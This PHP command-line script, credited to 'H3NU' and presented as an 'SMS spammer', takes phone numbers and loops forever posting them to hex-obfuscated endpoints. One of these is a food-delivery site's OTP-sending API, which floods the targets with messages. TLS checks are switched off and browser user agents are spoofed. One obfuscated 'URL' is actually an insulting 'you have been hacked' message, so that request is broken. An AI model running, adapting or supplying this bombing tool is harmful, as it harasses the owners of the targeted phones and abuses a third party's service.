#!/usr/bin/env php

#Dilarang copyright H3NU - AndroTech3nu 2018 15 08 12:30

<?php

if(strtolower(substr(PHP_OS, 0, 3)) == 'win') {

$R = "";

$RR = "";

$G = "";

$GG = "";

$B = "";

$BB = "";

$Y = "";

$YY = "";

$X = "";

$ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0';

} else {

$R = "\e[91m";

$RR = "\e[91;7m";

$G = "\e[92m";

$GG = "\e[92;7m";

$B = "\e[36m";

$BB = "\e[36;7m";

$Y = "\e[93m";

$YY = "\e[93;7m";

$X = "\e[0m";

$ua = 'Mozilla/5.0 (Linux; Android 5.1.1; Andromax A16C3H Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36';

system('clear');

}

if(function_exists('pcntl_signal')) {

	declare(ticks = 1);

	function signal_handler($signal) {

		global $Y,$X;

		switch($signal) {

		case SIGTERM:

		die($Y."\n====================[] H3NU []=====(√√√)>".$X."\n");

		case SIGKILL:

		die($Y."\n====================[] H3NU []=====(√√)>".$X."\n");

		case SIGINT:

		die($Y."\n====================[] H3NU []=====(√)>".$X."\n");

		}

	}

	pcntl_signal(SIGTERM, "signal_handler");

	pcntl_signal(SIGINT, "signal_handler");

}

function post_data($url,$data) {

	global $ua;

	$ch=curl_init($url);

	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

	curl_setopt($ch, CURLOPT_USERAGENT, $ua);

	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);

	return curl_exec($ch);

	curl_close($ch);

	}

	echo $Y.

"

___ ____ _____

|_ _/ ___|_ _|__ _ __ __ _ _ __ ___

| | | | |/ __| '_ \ / _` | '_ ` _ \

| | |___ | |\__ \ |_) | (_| | | | | | |

|___\____| |_||___/ .__/ \__,_|_| |_| |_|

|_|

";

echo $G."\n========[]H3NU SPAMER[]========".$X."\n";

echo $YY. $B."\n::###############################################";

echo $R."\n::############[WELCOME:MY:HOME]##################";

echo $YY."\n::#: #";

echo $BB."\n::#:Author ::[H3NU] #";

echo $B."\n::#:Instagram ::[@H3NU:]#";

echo $RR."\n::#:Github ::[http://github.com/h3nu:] #";

echo $R."\n::#:Facebook ::[AndroTechh3nu:] #";

echo $G."\n::#:YouTube ::[H3NU MYSTERIOUS:] #";

echo $GG."\n::#:Team ::[H3NU - AndroTechh3nu] #";

echo $YY."\n::#: #";

echo $R."\n::###########[THANKS:YOU]###########";

echo $B."\n::###############################################".$G.$X."\n\n";

isset($argv[1]) OR die($RR."[!] []== Input Namber plish ==[] [!]\n".$X);

if(is_numeric($argv[1])) {

	echo "[]Prossesing Spam SmS[] #".$G.$argv[1].$X."\n";

	post_data("\x68\x74\x74\x70\x3A\x2F\x2F\x64\x6F\x77\x6E\x6C\x6F\x61\x64\x6C\x61\x67\x75\x2E\x70\x6C\x61\x6E\x65\x74\x6C\x61\x67\x75\x2E\x73\x69\x74\x65\x2F\x73\x61\x76\x65\x2F\x30\x31\x25\x32\x30\x47\x6F\x62\x6C\x69\x6E\x25\x32\x30\x4F\x53\x54\x25\x32\x30\x53\x74\x61\x79\x25\x32\x30\x57\x69\x74\x68\x25\x32\x30\x4D\x65\x2E\x6D\x70\x33\x3F\x5F\x3D\x32","msisdn=".$argv[1]."&accept=call");

	while(1) {

		echo "[]H3NU Sending Massage To[] # ".$G.$argv[1].$X."\n";	

		post_data("\x48\x69\x20\x53\x65\x6C\x61\x6D\x61\x74\x20\x4B\x61\x6D\x75\x20\x54\x65\x6C\x61\x68\x20\x44\x69\x68\x61\x63\x6B\x20\x53\x61\x6C\x61\x6D\x20\x44\x61\x72\x69\x20\x53\x61\x79\x61\x20\x48\x33\x4E\x55\x2E\x20\x46\x55\x43\x4B\x20\x59\x4F\x55\x20\x2E","phone=".$argv[1]."&smsType=1");

		post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x70\x68\x64\x2e\x63\x6f\x2e\x69\x64\x2f\x65\x6e\x2f\x75\x73\x65\x72\x73\x2f\x73\x65\x6e\x64\x4f\x54\x50","phone_number=".$argv[1]);

	}

}

if(!file_exists($argv[1])) {

	die($RR."[!] File Not Exists [!]".$X."\n");

}

$argv[1]=explode("\n",file_get_contents($argv[1]));

$argv[1]=str_replace(' ','',$argv[1]);

foreach($argv[1] as $argv[2]):

echo "[]Prossessing spam sms[] #".$G.$argv[2].$X."\n";

	post_data("\x68\x74\x74\x70\x3A\x2F\x2F\x64\x6F\x77\x6E\x6C\x6F\x61\x64\x6C\x61\x67\x75\x2E\x70\x6C\x61\x6E\x65\x74\x6C\x61\x67\x75\x2E\x73\x69\x74\x65\x2F\x73\x61\x76\x65\x2F\x30\x31\x25\x32\x30\x47\x6F\x62\x6C\x69\x6E\x25\x32\x30\x4F\x53\x54\x25\x32\x30\x53\x74\x61\x79\x25\x32\x30\x57\x69\x74\x68\x25\x32\x30\x4D\x65\x2E\x6D\x70\x33\x3F\x5F\x3D\x32","msisdn=".$argv[2]."&accept=call");

endforeach;

while(1) {

foreach($argv[1] as $argv[2]):

echo "[]H3NU Sending Massage To[] # ".$G.$argv[2].$X."\n";

	post_data("\x48\x69\x20\x53\x65\x6C\x61\x6D\x61\x74\x20\x4B\x61\x6D\x75\x20\x54\x65\x6C\x61\x68\x20\x44\x69\x68\x61\x63\x6B\x20\x53\x61\x6C\x61\x6D\x20\x44\x61\x72\x69\x20\x53\x61\x79\x61\x20\x48\x33\x4E\x55\x2E\x20\x46\x55\x43\x4B\x20\x59\x4F\x55\x20\x2E","phone=".$argv[2]."&smsType=1");

	post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x70\x68\x64\x2e\x63\x6f\x2e\x69\x64\x2f\x65\x6e\x2f\x75\x73\x65\x72\x73\x2f\x73\x65\x6e\x64\x4f\x54\x50","phone_number=".$argv[2]);

endforeach;

}

